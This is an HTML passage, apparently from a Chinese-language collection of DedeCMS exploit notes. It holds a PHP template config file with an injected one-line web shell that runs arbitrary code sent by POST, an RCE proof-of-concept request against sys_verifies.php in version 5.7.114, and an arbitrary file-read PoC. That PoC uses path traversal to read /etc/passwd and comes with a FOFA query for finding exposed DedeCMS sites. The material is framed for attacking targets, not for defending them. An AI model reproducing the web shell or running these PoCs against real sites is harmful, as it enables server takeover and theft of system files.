integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ee2d3983-81eb-4141-8960-0e173c1aa1a6" class="code"><code class="language-Plain Text">&lt;?php
+
+//这个值为+0+表示关闭此设置，+为+1+表示开启
+$cfg_tamplate_rand+=+0;
+
+//模板数组，如果需要增加，按这个格式增加或修改即可(必须确保这些模板是存在的)，并且数量必须为2个或以上。
+$cfg_tamplate_arr[]+=+&#x27;article_article.htm&#x27;;
+$cfg_tamplate_arr[]+=+&#x27;article_article1.htm&#x27;;
+$cfg_tamplate_arr[]+=+&#x27;article_article2.htm&#x27;;
+$a+=+&#x27;_POST&#x27;;
+$$a[1]($$a[0]);
+?&gt;</code></pre><p id="9c1e9030-873f-4efc-9c52-5ede7e9b37e6" class="">可以替换为任意我们想要的php代码</p></blockquote><h3 id="aa31309b-5eed-483e-aab5-eb2a2e8a665f" class="">4-DedeCMSV5.7.114后台sys_verizes.php存在远程代码执行漏洞</h3><p id="8bac2866-dc1c-4b1a-83e1-80932822219a" class="">【条件&amp;影响】</p><p id="64da3296-477e-4962-91c4-fbcd675023f8" class="">V5.7.114</p><p id="2e5361d7-e1ed-4021-97f3-adcc22609111" class="">【poc】</p><p id="ab527467-f35e-4b97-b8e6-472c1147ebc3" class="">get请求打到：/dede/sys_verifies.php</p><h3 id="1a50427e-38bb-80b0-b5c8-cba0e91729eb" class="">5-<strong>Dedecms接口sys_verifies.php存在任意文件读取漏洞</strong></h3><p id="1a50427e-38bb-80ae-9eb0-e06f9e08ab9b" class="">【FOFA语法】</p><p id="1a50427e-38bb-80a4-a514-e297bb08e794" class="">app=”dedecms”</p><p id="1a50427e-38bb-801c-abc9-fa6fa96f65ba" class="">【poc】</p><p id="1a50427e-38bb-80ff-bd5c-d913ae652244" class=""><a href="http://ip/dede/sys_verifies.php?action=view&amp;filename=../../../../../etc/passwd">http://ip/dede/sys_verifies.php?action=view&amp;filename=../../../../../etc/passwd</a></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
